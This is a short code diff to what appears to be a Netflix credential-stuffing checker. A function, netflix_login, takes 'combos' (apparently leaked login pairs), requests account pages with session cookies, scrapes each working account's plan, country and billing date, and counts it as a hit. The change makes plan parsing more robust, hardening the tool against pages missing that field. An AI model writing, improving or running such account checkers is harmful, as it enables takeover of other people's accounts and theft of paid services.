@@ -366,7 +366,8 @@ def netflix_login(combos):
                 cookies=cookie,
                 timeout=10,
             ).text
-            plan = info.split('data-uia="plan-label"><b>')[1].split("</b>")[0]
+            
+            plan = info.split('data-uia="plan-label"><b>')[1].split("</b>")[0] if len(info.split('data-uia="plan-label"><b>')) > 1 else 'null'
             country = info.split('","currentCountry":"')[1].split('"')[0]
             expiry = info.split('data-uia="nextBillingDate-item">')[1].split("<")[0]
             hits += 1
